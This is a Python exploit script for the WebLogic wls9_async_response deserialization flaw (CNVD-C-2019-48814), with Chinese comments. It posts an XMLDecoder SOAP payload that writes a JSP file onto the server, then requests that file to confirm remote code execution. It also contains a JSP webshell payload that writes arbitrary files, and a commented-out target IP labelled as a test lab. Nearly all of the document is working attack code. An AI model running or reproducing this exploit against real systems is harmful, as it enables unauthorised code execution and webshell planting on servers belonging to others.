# CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化
# 靶场搭建 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
# 会在bea_wls_internal目录下生成test.jsp
# webshell路径：http://ip:port/bea_wls_internal/test.jsp

import requests
import sys
url = sys.argv[1]
# url = 'http://155.138.223.1:7001'     # 搭建的靶场，可供大家测试

test_payload = 'test CNVD-C-2019-48814'
webshell_payload = '''
<%  
if(request.getParameter("666")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("666"))).write(request.getParameter("t").getBytes());  
%>
'''

class Exploit:
    def attack(self, url):
        print('测试漏洞 [{}] :CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化'.format(url))
        headers = {"Content-Type": "text/xml",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"
                   }
        payload = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string><![CDATA[{}]]></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>

        '''.format(test_payload)
        try:
            attack_url = url + '/_async/AsyncResponseService'
            requests.post(url=attack_url, data=payload, headers=headers, timeout=10)
            jsp_path = url + '/bea_wls_internal/test.jsp'
            status_code = requests.get(url=jsp_path, headers=headers, timeout=10).status_code
            if status_code == 200:
                print("[+] WebLogic wls9_async_response RCE. path : {}".format(jsp_path))
            else:
                print('[-] [{}] 不存在漏洞'.format(url))
        except Exception as e:
            print('[-] Error : {}'.format(e.args))

Exploit().attack(url)